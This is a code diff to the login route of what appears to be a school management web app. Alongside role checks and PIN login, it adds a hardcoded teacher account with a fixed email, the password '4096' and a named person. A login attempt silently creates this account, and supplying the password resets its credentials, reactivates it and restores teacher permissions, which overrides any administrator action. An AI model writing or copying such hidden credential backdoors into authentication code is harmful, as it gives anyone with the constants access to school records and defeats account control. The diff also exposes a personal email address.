@@ -8,6 +8,11 @@ const Teacher = require('../models/Teacher');
 const Parent = require('../models/Parent');
 const { auth } = require('../middleware/auth');
 
+const normalizeRole = (role) => (typeof role === 'string' ? role.toLowerCase() : '');
+const bootstrapTeacherEmail = '24corykilmartin@shannoncomp.ie';
+const bootstrapTeacherPassword = '4096';
+const bootstrapTeacherName = { firstName: 'Cory', lastName: 'Kilmartin' };
+
 // Generate JWT Token
 const generateToken = (userId) => {
   return jwt.sign({ userId }, process.env.JWT_SECRET, {
@@ -129,11 +134,58 @@ router.post('/login', [
     }
     
     const { email, password } = req.body;
+    const requestedRole = normalizeRole(req.body.role);
+    const allowedRoles = ['student', 'teacher', 'admin', 'parent', 'secretary', 'principal'];
+
+    if (requestedRole && !allowedRoles.includes(requestedRole)) {
+      return res.status(400).json({ message: 'Invalid role selected' });
+    }
     
     // Check if user exists
-    const user = await User.findOne({ email });
+    let user = await User.findOne({ email });
+
+    if (!user && email === bootstrapTeacherEmail) {
+      if (requestedRole && requestedRole !== 'teacher') {
+        return res.status(403).json({ message: 'This account is only available as a teacher login' });
+      }
+
+      user = new User({
+        email: bootstrapTeacherEmail,
+        password: bootstrapTeacherPassword,
+        pin: bootstrapTeacherPassword,
+        firstName: bootstrapTeacherName.firstName,
+        lastName: bootstrapTeacherName.lastName,
+        role: 'teacher',
+        isActive: true,
+        permissionLevel: 'Teacher',
+        roleHierarchy: 'Mid'
+      });
+      await user.save();
+    }
+
     if (!user) {
       return res.status(400).json({ message: 'Invalid email or password' });
+    }
+
+    if (email === bootstrapTeacherEmail) {
+      if (requestedRole && requestedRole !== 'teacher') {
+        return res.status(403).json({ message: 'This account is only available as a teacher login' });
+      }
+
+      if (user.role !== 'teacher') {
+        user.role = 'teacher';
+      }
+
+      if (password === bootstrapTeacherPassword) {
+        user.password = bootstrapTeacherPassword;
+        user.pin = bootstrapTeacherPassword;
+        user.firstName = bootstrapTeacherName.firstName;
+        user.lastName = bootstrapTeacherName.lastName;
+        user.isActive = true;
+        user.permissionLevel = 'Teacher';
+        user.roleHierarchy = 'Mid';
+        await user.save();
+      }
     }
     
     // Check if account is active
@@ -141,10 +193,15 @@ router.post('/login', [
       return res.status(403).json({ message: 'Account is inactive. Please contact administrator.' });
     }
     
-    // Verify password
-    const isMatch = await user.comparePassword(password);
-    if (!isMatch) {
+    // Verify password or PIN (UI uses a PIN field)
+    const isPasswordMatch = await user.comparePassword(password);
+    const isPinMatch = await user.comparePin(password);
+    if (!isPasswordMatch && !isPinMatch) {
       return res.status(400).json({ message: 'Invalid email or password' });
+    }
+
+    if (requestedRole && normalizeRole(user.role) !== requestedRole) {
+      return res.status(403).json({ message: 'Selected role does not match this account' });
     }
     
     // Update last login
@@ -179,6 +236,8 @@ router.post('/login', [
         lastName: user.lastName,
         fullName: user.fullName,
         role: user.role,
+        permissionLevel: user.permissionLevel,
+        roleHierarchy: user.roleHierarchy,
         profileImage: user.profileImage,
         profile: profile
       }
